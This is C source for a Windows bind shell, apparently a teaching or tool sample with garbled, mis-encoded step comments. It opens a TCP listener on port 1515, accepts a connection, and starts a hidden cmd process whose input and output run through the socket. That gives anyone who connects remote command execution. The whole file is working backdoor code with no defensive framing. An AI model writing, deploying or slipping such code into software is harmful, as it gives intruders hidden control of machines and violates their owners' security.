#include <winsock2.h>
#pragma  comment(lib, "Ws2_32.lib")

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	//1. ��ʼ��Winsock����
	WSADATA stWSA;
	WSAStartup(0x0202, &stWSA);

	//2. ����ԭʼ�׽���
	SOCKET stListen = INVALID_SOCKET;
	stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	unsigned short int port = htons(1515);
	//3. �������ַ�󶨶˿�1515
	SOCKADDR_IN stService;
	stService.sin_addr.S_un.S_addr = INADDR_ANY;
	stService.sin_port = htons(1515);
	stService.sin_family = AF_INET;
	bind(stListen, (LPSOCKADDR)&stService, sizeof(stService));

	//4. ��������
	listen(stListen, SOMAXCONN);

	//5. ����һ������
	stListen = accept(stListen, 0, 0);

	//6.����һ��cmd����,����������������ض�λ�����Ǵ������׽�����
	PROCESS_INFORMATION  stPI = { 0 };
	STARTUPINFOA stSI = { 0 };
	stSI.cb = sizeof(stSI);
	stSI.wShowWindow = SW_HIDE;
	stSI.dwFlags = STARTF_USESTDHANDLES;
	stSI.hStdInput = (HANDLE)stListen;
	stSI.hStdOutput = (HANDLE)stListen;
	stSI.hStdError = (HANDLE)stListen;
	CreateProcessA(0, "cmd", 0, 0, TRUE, 0, 0, 0, &stSI, &stPI);

	//7.�ͷ���صľ��;
	CloseHandle(stPI.hProcess);
	CloseHandle(stPI.hThread);
	closesocket(stListen);
	WSACleanup();

}
